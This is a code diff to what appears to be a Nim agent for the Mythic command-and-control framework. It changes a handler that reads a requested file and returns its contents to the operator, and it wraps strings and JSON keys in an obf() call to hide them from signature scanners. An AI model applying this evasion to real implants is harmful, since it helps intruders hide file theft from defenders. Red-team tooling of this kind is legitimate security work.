@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat, os, strutils]
 
 type
@@ -22,7 +23,7 @@ proc catFile*(taskId: string, params: string): JsonNode =
     
     # Check if file exists
     if not fileExists(fullPath):
-      return mythicError(taskId, &"File not found: {fullPath}")
+      return mythicError(taskId, obf("File not found: ") & fullPath)
     
     # Read file contents
     let content = readFile(fullPath)
@@ -31,16 +32,16 @@ proc catFile*(taskId: string, params: string): JsonNode =
     
     # Create response with artifact
     var response = mythicSuccess(taskId, content)
-    response["artifacts"] = %* [
+    response[obf("artifacts")] = %* [
       {
-        "base_artifact": "FileOpen",
-        "artifact": fullPath
+        obf("base_artifact"): obf("FileOpen"),
+        obf("artifact"): fullPath
       }
     ]
     
     return response
     
   except IOError as e:
-    return mythicError(taskId, &"Failed to read file: {e.msg}")
+    return mythicError(taskId, obf("Failed to read file: ") & e.msg)
   except Exception as e:
     return mythicError(taskId, &"Error: {e.msg}")
